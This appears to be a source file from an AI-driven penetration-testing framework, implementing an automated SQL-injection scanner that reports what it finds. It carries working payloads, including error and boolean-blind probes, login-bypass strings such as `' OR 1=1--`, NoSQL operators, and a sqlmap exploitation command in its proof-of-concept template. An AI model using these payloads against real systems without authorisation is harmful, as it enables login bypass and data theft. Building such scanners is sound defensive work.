"""`scan_sqli` — deterministic SQL-injection specialist (roadmap §8.5
Phase 3b).

Single-shot SQL-injection detector that probes a URL+param set with
classic SQL-error and boolean-difference payloads, classifies
responses, and **auto-emits findings via `add_vulnerability_report`**
so the lead agent doesn't have to handle the emit-tool's parameter
schema.

Detection strategy (deterministic, no LLM)
------------------------------------------

For each param under test, send four request variants:

  1. **Baseline** — the param's original value (or a benign control).
     Captures the "normal" response signature.
  2. **Error-trigger** — append a malformed-SQL fragment (`'`).
     If the server's response now contains a database-error
     fingerprint (`ORA-01756`, `mysql_fetch_array`, `unclosed
     quotation mark`, `Microsoft SQL Server`, etc.), that's a
     direct error-based SQLi confirmation.
  3. **Boolean-true** — append `' OR '1'='1`. If the response
     differs MEANINGFULLY from the baseline (length / status /
     content), the host evaluates the injected condition.
  4. **Boolean-false** — append `' OR '1'='2`. If this response
     resembles the baseline (and DIFFERS from the boolean-true
     response), confirms the host distinguishes true/false → SQLi
     present even without an explicit error.

The boolean-pair test is what catches "blind" SQLi where the host
swallows errors. Two checks must both fire (true≠false AND
true≠baseline) to confirm; weaker signals downgrade to
`pattern_match` instead of `verified`.

Limitations (Phase 3b minimal scope)
------------------------------------

  * GET requests only. POST / JSON / cookie SQLi is Phase 3c.
  * No time-based / out-of-band detection — those need timing-
    accurate measurements which deterministic-with-jitter HTTP
    probes can't reliably do (a sqlmap-style specialist would
    handle this; track as Phase 4).
  * No second-order SQLi (where injection is stored, then
    triggered on a different request).
"""

from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# Database-error fingerprints. When the response body matches ANY
# pattern, error-based SQLi is confirmed. Patterns are case-
# insensitive substring matches (cheap; no regex needed for these).
_DB_ERROR_FRAGMENTS: tuple[tuple[str, str], ...] = (
    # MySQL
    ("you have an error in your sql syntax", "MySQL"),
    ("supplied argument is not a valid mysql", "MySQL"),
    ("mysql_fetch_array(", "MySQL"),
    ("mysql_num_rows(", "MySQL"),
    ("mysqli::", "MySQL"),
    # PostgreSQL
    ("pg_exec(", "PostgreSQL"),
    ("postgresql query failed", "PostgreSQL"),
    ("npgsql.", "PostgreSQL"),
    # MS SQL Server
    ("microsoft sql server", "MSSQL"),
    ("microsoft ole db provider for sql", "MSSQL"),
    ("unclosed quotation mark", "MSSQL"),
    ("system.data.sqlclient.sqlexception", "MSSQL"),
    # Oracle
    ("ora-01756", "Oracle"),
    ("ora-00933", "Oracle"),
    ("ora-00921", "Oracle"),
    ("ora-00936", "Oracle"),
    ("oracle.dataaccess", "Oracle"),
    # SQLite
    ("sqlite/jdbcdriver", "SQLite"),
    ("sqlite_query(", "SQLite"),
    ("near \"select\": syntax error", "SQLite"),
    ("sqlite3.operationalerror", "SQLite"),
    # Generic
    ("syntax error converting", "MSSQL"),
    ("sql syntax", "Generic"),
)


_PROBE_PAYLOADS: dict[str, str] = {
    "error_trigger": "'",
    "boolean_true": "' OR '1'='1",
    "boolean_false": "' OR '1'='2",
}


# Roadmap §8.5 Phase 7 — auth-bypass payloads. The boolean-blind
# triplet above mis-detects on auth endpoints because the
# `' OR '1'='1` style only works when the SQL query is unquoted
# (`WHERE x = '...'`) AND the comparison is direct. Many real
# login endpoints use the `--` comment-out style instead:
#
#   email = '<input>' AND password = HASH(<pw>)
#                ^ SQLi here closes string, then `OR 1=1--`
#                  comments out the password check.
#
# These payloads are the canonical "log in as anyone" set. Each
# is tried; if ANY of them produces a strong success signal
# (2xx + JWT / "token" / "success":true) AND the baseline
# response doesn't, auth-bypass is confirmed.
_AUTH_BYPASS_PAYLOADS: dict[str, str] = {
    "auth_bypass_or_1_dashes":     "' OR 1=1--",
    "auth_bypass_admin_or":        "admin' OR 1=1--",
    "auth_bypass_or_quoted":       "' OR '1'='1' --",
    "auth_bypass_or_hash":         "' OR 1=1#",
    "auth_bypass_admin_hash":      "admin'#",
    "auth_bypass_or_semicolon":    "' OR 1=1;--",
    "auth_bypass_close_paren":     "') OR 1=1--",
    "auth_bypass_admin_close_p":   "admin') OR 1=1--",
}


# Roadmap §8.5 Phase 6 — NoSQL operator payloads. When the probed
# endpoint is JSON-body-shaped (i.e. `body_template` is a dict), the
# scanner ALSO sends NoSQL operator injections. MongoDB / similar
# databases parse these operators and evaluate them server-side —
# `{"$gt":""}` always returns true, `{"$ne":null}` matches any
# non-null, etc. Detection: same boolean-blind heuristic; the
# operator-substituted body acts as the "true" branch.
_NOSQL_PAYLOADS: dict[str, Any] = {
    "nosql_gt_empty": {"$gt": ""},          # always-true (MongoDB)
    "nosql_ne_null": {"$ne": None},          # always-true; CouchDB-compat
    "nosql_regex_any": {"$regex": ".*"},     # always-match
    "nosql_where_sleep": {"$where": "sleep(1)"},  # time-based; not used in heuristic
}


def _build_url_with_param(
    url: str, *, param_name: str, value: str,
    other_params: dict[str, str] | None = None,
) -> str:
    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat: dict[str, str] = {k: (v[0] if v else "") for k, v in qs.items()}
    if other_params:
        for k, v in other_params.items():
            if k != param_name and k not in flat:
                flat[k] = v
    flat[param_name] = value
    return urlunparse(parts._replace(query=urlencode(flat, doseq=False)))


def _detect_db_error(body: str) -> tuple[bool, str | None]:
    """Returns `(detected, db_engine)`. Case-insensitive substring
    match against the fingerprint table."""
    if not isinstance(body, str) or not body:
        return False, None
    lower = body.lower()
    for fragment, engine in _DB_ERROR_FRAGMENTS:
        if fragment in lower:
            return True, engine
    return False, None


def _strip_dynamic_noise(body: str) -> str:
    """Strip timestamps / nonces / random tokens that vary across
    identical requests, so boolean-true vs baseline comparison isn't
    drowned by per-request churn. Conservative — leaves most content
    intact; just removes obvious volatile patterns."""
    if not isinstance(body, str):
        return ""
    # Strip CSRF-token-shaped fragments.
    body = re.sub(r"[a-fA-F0-9]{32,}", "", body)
    # Strip ISO timestamps.
    body = re.sub(
        r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}[.\d]*[Zz]?",
        "", body,
    )
    # Strip request IDs (UUIDs).
    body = re.sub(
        r"[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-"
        r"[a-fA-F0-9]{4}-[a-fA-F0-9]{12}",
        "", body,
    )
    # Collapse whitespace runs to a single space.
    body = re.sub(r"\s+", " ", body).strip()
    return body


def _bodies_meaningfully_differ(a: str, b: str) -> bool:
    """True when two normalised bodies differ by more than 5% of
    their length OR by a meaningful content delta (loose threshold
    — meant to catch true/false branching, not minor template
    variation).

    Roadmap §8.5 Phase 6 — also fires when the two responses come
    from genuinely different code paths (e.g. {"success":true,
    "token":"..."} vs {"success":false,"error":"invalid"}). Length
    might be similar but the JSON shape differs entirely.
    """
    a = _strip_dynamic_noise(a)
    b = _strip_dynamic_noise(b)
    if not a and not b:
        return False
    if not a or not b:
        return True
    longer = max(len(a), len(b))
    if longer == 0:
        return False
    # Crude but cheap: count differing substring chunks.
    # Use length-delta as the signal (response length tracks content).
    diff = abs(len(a) - len(b))
    if diff / longer > 0.05:
        return True
    # Length similar but content might still differ. Hash-fingerprint
    # the first 4KB and compare.
    if a[:4000] != b[:4000]:
        return True
    # Last resort — same fingerprint up to 4KB.
    return False


def _is_auth_success_response(status: int | None, body: str) -> bool:
    """Return True when the response shape strongly indicates a
    successful auth — 2xx + a token-bearing JSON shape.

    Used by the auth-bypass detection path: when an SQLi payload
    produces such a response and the baseline (random invalid
    creds) doesn't, we have a confirmed auth bypass.
    """
    if not isinstance(status, int) or not (200 <= status < 300):
        return False
    if not isinstance(body, str) or not body:
        return False
    body_lc = body.lower()
    # Strong negative markers — even on 2xx, presence means failure.
    for neg in ("invalid email", "invalid credential", "invalid login",
                "incorrect password", "wrong password", "authentication failed",
                "login failed", "unauthorized"):
        if neg in body_lc:
            return False
    # Strong positives — a token shape OR explicit success.
    import re as _re
    jwt_re = _re.compile(r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b")
    if jwt_re.search(body):
        return True
    for marker in ('"token"', '"accesstoken"', '"jwt"', '"sessionid"',
                   '"id_token"', '"success":true', '"authentication"'):
        if marker in body_lc:
            return True
    return False


def _strong_response_signal_differs(
    body_a: str, status_a: int | None,
    body_b: str, status_b: int | None,
) -> bool:
    """Strong differentiation signal — handles cases where login
    endpoints return same-shape bodies for different SUCCESS states
    (e.g. 200 with {token: ...} vs 401 with {error: ...}). Length
    might be similar but the success/failure flag differs.

    The boolean-blind comparator before Phase 6 missed this because
    both branches had similar length/error structure. New signal:
    look for SUCCESS-vs-FAILURE markers AND status-code class change.
    """
    # Status-class differential is the strongest signal.
    if isinstance(status_a, int) and isinstance(status_b, int):
        # 2xx vs non-2xx is a clean differentiator.
        if (200 <= status_a < 300) != (200 <= status_b < 300):
            return True

    if not isinstance(body_a, str) or not isinstance(body_b, str):
        return False
    a_lc = body_a.lower()
    b_lc = body_b.lower()

    # Success markers in one but not the other.
    success_markers = ('"token"', '"accesstoken"', '"jwt"', '"sessionid"',
                       '"id_token"', '"success":true', '"authenticated":true')
    error_markers = ("invalid", "incorrect", "unauthorized", "forbidden",
                     "denied", '"error"', '"success":false')

    a_has_success = any(m in a_lc for m in success_markers)
    b_has_success = any(m in b_lc for m in success_markers)
    a_has_error = any(m in a_lc for m in error_markers)
    b_has_error = any(m in b_lc for m in error_markers)

    # If one branch shows success markers and the other shows error
    # markers, the responses come from different code paths — strong
    # differentiation.
    if a_has_success != b_has_success:
        return True
    if a_has_error != b_has_error:
        return True
    return False


def _emit_finding(
    *,
    url: str,
    param: str,
    detection_kind: str,           # "error" | "boolean"
    db_engine: str | None,
    payload: str,
    response_excerpt: str,
    verification_status: str,      # "verified" | "pattern_match"
    confidence: float,
) -> str | None:
    """Emit via `tracer.add_vulnerability_report`. Best-effort; never
    raises. Returns finding id on success, None on failure."""
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        if detection_kind == "error":
            title = f"Error-based SQL injection in `{param}`"
        elif detection_kind == "auth_bypass":
            title = f"SQL injection auth bypass in `{param}` (login endpoint)"
        else:
            title = f"Boolean-blind SQL injection in `{param}`"
        engine_str = f" (DB engine: {db_engine})" if db_engine else ""
        # Severity bump: auth bypass via SQLi is critical (account
        # takeover from an unauthenticated attacker); error-based and
        # boolean-blind start at high.
        severity_for_kind = "critical" if detection_kind == "auth_bypass" else "high"
        return tracer.add_vulnerability_report(
            title=title,
            severity=severity_for_kind,
            cwe="CWE-89",
            endpoint=url,
            target=url,
            category="sqli",
            verification_status=verification_status,
            confidence=confidence,
            description=(
                f"The `{param}` query parameter at `{url}` is "
                f"vulnerable to SQL injection.{engine_str} Probe "
                f"payload: `{payload}`. "
                + (
                    f"Response contains database-error fingerprint, "
                    f"confirming the parameter flows directly into a "
                    f"database query without parameterisation."
                    if detection_kind == "error"
                    else "Response differs measurably between the "
                    "boolean-true (`' OR '1'='1`) and boolean-false "
                    "(`' OR '1'='2`) payloads while baseline matches "
                    "boolean-false — the host evaluates the injected "
                    "SQL clause."
                )
            ),
            impact=(
                "SQL injection. An attacker can extract arbitrary "
                "data from the database (credentials, tokens, PII), "
                "modify or delete rows, escalate privileges via "
                "INSERT/UPDATE on auth tables, and depending on the "
                "DB engine and connector permissions, achieve remote "
                "code execution via UDFs, xp_cmdshell, or "
                "out-of-band channels. This is a critical-severity "
                "issue on any production target."
            ),
            technical_analysis=(
                f"Probe URL: {url}\n"
                f"Param: {param}\n"
                f"Payload: {payload}\n"
                f"Detection: {detection_kind}-based\n"
                + (f"DB engine fingerprinted: {db_engine}\n" if db_engine else "")
                + f"Response excerpt:\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET request to {url} with `{param}` set to "
                f"`{payload}`.\n"
                + (
                    "2. Observe the database-error message in the "
                    "response body — confirms the parameter is "
                    "concatenated into a SQL query.\n"
                    "3. Pivot to data extraction with UNION-based or "
                    "blind-boolean exploitation (sqlmap can automate)."
                    if detection_kind == "error"
                    else "2. Repeat with `' OR '1'='2` — observe the "
                    "response now resembles the baseline (matches "
                    "false branch), while `' OR '1'='1` returned a "
                    "different response (matches true branch).\n"
                    "3. Pivot to blind-boolean data extraction "
                    "(sqlmap `-p {param} --technique=B`)."
                )
            ),
            poc_script_code=(
                f"# Reproduce the detection\n"
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'\n"
                f"\n"
                f"# Pivot to automated exploitation\n"
                f"sqlmap -u '{url}' -p {param} --batch --risk=2 --level=3"
            ),
            remediation_steps=(
                "Replace string-concatenated SQL queries with "
                "parameterised queries (prepared statements) using "
                "the database driver's parameter-binding API. NEVER "
                "interpolate user input directly into SQL strings, "
                "even after escaping — always use bound parameters. "
                "For ORM-based code (Django, SQLAlchemy, Hibernate, "
                "ActiveRecord, Entity Framework), use the ORM's "
                "query builder rather than raw-SQL helpers. Add a "
                "Web Application Firewall (e.g. ModSecurity OWASP "
                "Core Rule Set) as defense-in-depth, but DO NOT "
                "rely on it as the only mitigation."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "U", "C": "H", "I": "H", "A": "H",
            },
            reasoning_trace=[
                f"Probed {param}= with {detection_kind}-based payload "
                f"`{payload}`.",
                f"Detection signal: "
                + (
                    f"DB error fingerprint matched ({db_engine})."
                    if detection_kind == "error"
                    else "boolean-true response differs from "
                    "boolean-false response while baseline matches "
                    "boolean-false."
                ),
                "No timing or behaviour confirmation needed — "
                "deterministic detection based on observed response "
                "shape.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_sqli: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="sqli-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 90},
    sandbox_execution=False,  # host execution; proxy_manager handles host.docker.internal → 127.0.0.1 fallback
    provenance="framework",
    mitre_techniques=["T1190"],  # Exploit Public-Facing Application
)
def scan_sqli(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    other_params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
    method: str = "GET",
    body_template: dict[str, Any] | str | None = None,
    body_format: str = "auto",
) -> SpecialistResult:
    """Deterministic SQL-injection scanner.

    Args:
        url: target URL. May contain `{param}` placeholders for
            path-param substitution (e.g.
            `http://x/api/Baskets/{id}`).
        params: list of param names to probe; falls back to URL
            query-string keys when None.
        other_params: baseline values for OTHER params on the URL.
        extra_headers: optional headers to forward (e.g. auth).
        method: HTTP method. Default `GET` (Phase 3b behaviour).
            Modern APIs use `POST`/`PUT`/`PATCH` with a body — supply
            `body_template` along with the method to probe those.
        body_template: optional body for non-GET methods.
            * `dict` → JSON-encoded by default (`body_format="auto"`
              infers JSON), or form-encoded with `body_format="form"`.
              The named param's value is replaced with each probe
              payload.
            * `str` → raw body with `{param}` placeholder for
              substitution.
            * `None` (default) → param is substituted into the URL
              query string (Phase 3b behaviour).
        body_format: `"json"` / `"form"` / `"auto"`. Inferred when
            `"auto"` and `body_template` is a dict (→ JSON).

    Auto-emits one `add_vulnerability_report` per (param × detection)
    via the global tracer. Returns a `SpecialistResult` with mirror
    drafts so the lead agent can see what was detected; canonical
    findings live in `vulnerabilities.json`.

    Examples:
        # Phase 3b — GET with query string.
        scan_sqli(url="http://x/search?q=test", params=["q"])

        # Phase 3c — POST + JSON body (Juice Shop login).
        scan_sqli(
            url="http://x/rest/user/login",
            method="POST",
            params=["email"],
            body_template={"email": "x@example.com", "password": "x"},
        )

        # Phase 3c — path param.
        scan_sqli(
            url="http://x/api/Baskets/{id}",
            method="GET",
            params=["id"],
        )

        # Phase 3c — POST + form body.
        scan_sqli(
            url="http://x/login.php",
            method="POST",
            params=["username"],
            body_template={"username": "admin", "password": "x"},
            body_format="form",
        )
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    from strix.tools.specialist._request_builders import (
        build_request,
        is_path_param_url,
    )

    # Roadmap §8.5 Phase 3c — forgiving arg handling. Empirically the
    # LLM (gemini-2.5-pro) often calls these specialists with:
    #   * `param="email"` (singular) instead of `params=["email"]`
    #   * `params="email"` (string) instead of `params=["email"]`
    #   * `body_template="{\"email\":\"x\"}"` (JSON string) instead of
    #     a dict literal — the XML-tool-call format encourages string-
    #     typed args even when the schema is dict.
    # Without this normalisation, every such call returns a TypeError
    # and the scan stalls. Accept the variants here.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]
    if isinstance(body_template, str):
        # If the string looks like a JSON object, try parsing it.
        # Falls back to raw-template-string mode on parse failure.
        s = body_template.strip()
        if s.startswith("{") and s.endswith("}"):
            try:
                import json as _json
                parsed_template = _json.loads(s)
                if isinstance(parsed_template, dict):
                    body_template = parsed_template
            except Exception:  # noqa: BLE001
                pass  # leave as raw string — let build_request handle it

    parsed = urlparse(url)
    if not params:
        # Three fallbacks for inferring params:
        #   1. URL query string keys (existing).
        #   2. body_template dict keys (new — Phase 3c).
        #   3. {placeholder} markers in URL path (new — path params).
        if parsed.query:
            params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
        elif isinstance(body_template, dict):
            params = list(body_template.keys())
        else:
            # Look for {name} placeholders in URL path.
            import re as _re
            params = _re.findall(r"\{([a-zA-Z_][a-zA-Z0-9_]*)\}", url)
    if not params:
        return SpecialistResult(
            status="partial",
            error="no params supplied and could not infer from URL/body",
            evidence=[
                f"scan_sqli invoked on {url!r} with no params; "
                "supply `params=[...]`, include a query string, "
                "supply a `body_template` dict, or use `{name}` "
                "placeholders in the URL path."
            ],
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    def _probe(probe_value: str, label: str) -> dict[str, Any] | None:
        nonlocal probe_count
        try:
            req_method, req_url, req_headers, req_body = build_request(
                url=url, method=method,
                param_name=param, payload=probe_value,
                body_template=body_template, body_format=body_format,
                other_params=other_params, extra_headers=extra_headers,
            )
            resp = pm.send_simple_request(
                req_method, req_url,
                headers=req_headers,
                body=req_body,
                timeout=15,
            )
            probe_count += 1
            return resp
        except Exception as e:  # noqa: BLE001
            evidence.append(f"transport error for {param!r} ({label}): {e}")
            return None

    for param in params:
        if not isinstance(param, str) or not param.strip():
            continue
        param = param.strip()
        key = (parsed.path or "/", param)
        if key in seen_endpoint_param:
            continue

        # Establish baseline.
        baseline_resp = _probe("strix_baseline_value", "baseline")
        if not baseline_resp or "error" in baseline_resp and not baseline_resp.get("status_code"):
            evidence.append(f"baseline failed for {param!r}; skipping")
            continue
        baseline_body = baseline_resp.get("body") or ""
        baseline_status = baseline_resp.get("status_code")

        # 1. Error-based detection.
        err_resp = _probe(_PROBE_PAYLOADS["error_trigger"], "error_trigger")
        if err_resp and err_resp.get("status_code"):
            err_body = err_resp.get("body") or ""
            detected, engine = _detect_db_error(err_body)
            if detected:
                seen_endpoint_param.add(key)
                excerpt = err_body[:1500]
                report_id = _emit_finding(
                    url=url, param=param,
                    detection_kind="error",
                    db_engine=engine,
                    payload=_PROBE_PAYLOADS["error_trigger"],
                    response_excerpt=excerpt,
                    verification_status="verified",
                    confidence=0.95,
                )
                if report_id:
                    emitted_count += 1
                drafts.append(FindingDraft(
                    title=f"Error-based SQL injection in `{param}`",
                    severity="high",
                    cwe="CWE-89",
                    endpoint=url,
                    category="sqli",
                    verification_status="verified",
                    confidence=0.95,
                    description=(
                        f"DB error fingerprint ({engine}) detected on "
                        f"{param}={_PROBE_PAYLOADS['error_trigger']}"
                    ),
                ))
                evidence.append(
                    f"error-based SQLi: {param}, engine={engine}"
                )
                continue  # don't double-emit boolean check on same param

        # 1.5. Auth-bypass detection (Phase 7 — closes the
        # `sqli-login` manifest gap). When the baseline returns a
        # failure shape (401 + invalid creds) but an SQLi payload
        # produces a 2xx + token shape, that's a confirmed auth
        # bypass via SQLi — even when the boolean-blind comparator
        # can't distinguish it (e.g. true/false branches both 401
        # because the parameterized failure path catches them, but
        # `' OR 1=1--` comments out the password check entirely).
        baseline_is_auth_failure = (
            isinstance(baseline_status, int)
            and not _is_auth_success_response(baseline_status, baseline_body)
        )
        if baseline_is_auth_failure:
            for label, payload in _AUTH_BYPASS_PAYLOADS.items():
                bypass_resp = _probe(payload, label)
                if not bypass_resp or not bypass_resp.get("status_code"):
                    continue
                bypass_status = bypass_resp.get("status_code")
                bypass_body = bypass_resp.get("body") or ""
                if _is_auth_success_response(bypass_status, bypass_body):
                    seen_endpoint_param.add(key)
                    excerpt = (
                        f"baseline (random invalid creds) → "
                        f"status={baseline_status}, body[:100]="
                        f"{baseline_body[:100]!r}\n"
                        f"SQLi auth-bypass payload `{payload}` → "
                        f"status={bypass_status}, body[:200]="
                        f"{bypass_body[:200]!r}"
                    )
                    report_id = _emit_finding(
                        url=url, param=param,
                        detection_kind="auth_bypass",
                        db_engine=None,
                        payload=payload,
                        response_excerpt=excerpt,
                        verification_status="verified",
                        confidence=0.98,
                    )
                    if report_id:
                        emitted_count += 1
                    drafts.append(FindingDraft(
                        title=f"SQL injection auth bypass in `{param}` (payload: `{payload}`)",
                        severity="critical",
                        cwe="CWE-89",
                        endpoint=url, category="sqli",
                        verification_status="verified",
                        confidence=0.98,
                        description=(
                            f"Auth bypass via SQLi payload `{payload}` — "
                            f"baseline returned auth-failure shape, payload "
                            f"returned 2xx + token shape."
                        ),
                    ))
                    evidence.append(
                        f"auth-bypass SQLi: {param}={payload[:30]}... "
                        f"baseline_status={baseline_status} → bypass_status={bypass_status}"
                    )
                    break  # one finding per param
            if key in seen_endpoint_param:
                continue  # don't run boolean-blind on same param

        # 2. Boolean-blind detection (only if error / auth-bypass paths didn't fire).
        true_resp = _probe(_PROBE_PAYLOADS["boolean_true"], "bool_true")
        false_resp = _probe(_PROBE_PAYLOADS["boolean_false"], "bool_false")
        if not true_resp or not false_resp:
            continue
        true_body = true_resp.get("body") or ""
        false_body = false_resp.get("body") or ""
        true_status = true_resp.get("status_code")
        false_status = false_resp.get("status_code")

        # Confirm: true ≠ false AND baseline ≈ false (or status matches).
        # Phase 6 — also accept the strong signal (success vs error
        # markers, status class change). The boolean-blind heuristic
        # was missing logins that returned same-length 401-shape
        # responses for both true/false branches when the SQLi failed,
        # while a successful boolean-true returned 200+JWT.
        true_vs_false_differs = (
            true_status != false_status
            or _bodies_meaningfully_differ(true_body, false_body)
            or _strong_response_signal_differs(
                true_body, true_status,
                false_body, false_status,
            )
        )
        baseline_vs_false_similar = (
            baseline_status == false_status
            and not _bodies_meaningfully_differ(baseline_body, false_body)
        )
        if true_vs_false_differs and baseline_vs_false_similar:
            seen_endpoint_param.add(key)
            # Use the first 1500 chars of the TRUE response since
            # that's the "anomalous" branch.
            excerpt = (
                f"baseline len={len(baseline_body)} status={baseline_status}\n"
                f"' OR '1'='1 → len={len(true_body)} status={true_status}\n"
                f"' OR '1'='2 → len={len(false_body)} status={false_status}\n\n"
                f"true-branch excerpt:\n{true_body[:1000]}"
            )
            report_id = _emit_finding(
                url=url, param=param,
                detection_kind="boolean",
                db_engine=None,
                payload=_PROBE_PAYLOADS["boolean_true"],
                response_excerpt=excerpt,
                verification_status="pattern_match",
                confidence=0.75,
            )
            if report_id:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"Boolean-blind SQL injection in `{param}`",
                severity="high",
                cwe="CWE-89",
                endpoint=url,
                category="sqli",
                verification_status="pattern_match",
                confidence=0.75,
                description=(
                    f"Boolean-blind SQLi on {param}; true ≠ false "
                    f"and baseline ≈ false."
                ),
            ))
            evidence.append(
                f"boolean-blind SQLi: {param} "
                f"(true_len={len(true_body)} vs false_len={len(false_body)})"
            )

    # Roadmap §8.5 Phase 5 — record probe coverage in SecurityContext.
    try:
        from strix.agents.security_context import record_endpoint

        record_endpoint(url, method=method, params=params, probed_for="sqli")
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["follow-up with sqlmap for automated extraction"]
            if drafts else
            ["no SQLi detected on listed params; consider POST/JSON "
             "body params and authenticated probes"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "findings_emitted_to_tracer": emitted_count,
            "scheme": parsed.scheme,
            "host": parsed.netloc,
        },
    )
